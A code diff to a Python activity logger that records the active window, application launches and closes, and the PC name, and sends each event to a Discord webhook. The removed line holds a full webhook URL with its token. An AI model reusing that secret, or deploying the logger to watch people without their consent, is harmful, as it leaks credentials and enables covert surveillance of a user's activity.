@@ -8,7 +8,7 @@ import socket
 from datetime import datetime
 
 # Discord Webhook URL
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"
+WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
 
 # Get PC name
 PC_NAME = socket.gethostname()
@@ -16,6 +16,7 @@ PC_NAME = socket.gethostname()
 # Store last logged application and its start time to track duration
 last_logged = None
 app_start_time = None
+active_processes = set()
 
 # Function to get active window title
 def get_active_window_title():
@@ -48,10 +49,21 @@ def send_to_discord(message):
 
 # Monitoring loop
 def monitor():
-    global last_logged, app_start_time
+    global last_logged, app_start_time, active_processes
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         app_name, window_title = get_active_window_title()
+        current_processes = {proc.info['name'] for proc in psutil.process_iter(['name'])}
+        closed_processes = active_processes - current_processes
+
+        # Detect closed applications
+        for closed_app in closed_processes:
+            if closed_app:
+                duration = time.time() - app_start_time if app_start_time else 0
+                close_message = f"[{timestamp}] {PC_NAME} - User closed {closed_app} after {duration:.2f} seconds"
+                send_to_discord(close_message)
+        
+        active_processes = current_processes
         
         if app_name:
             if (app_name, window_title) != last_logged:
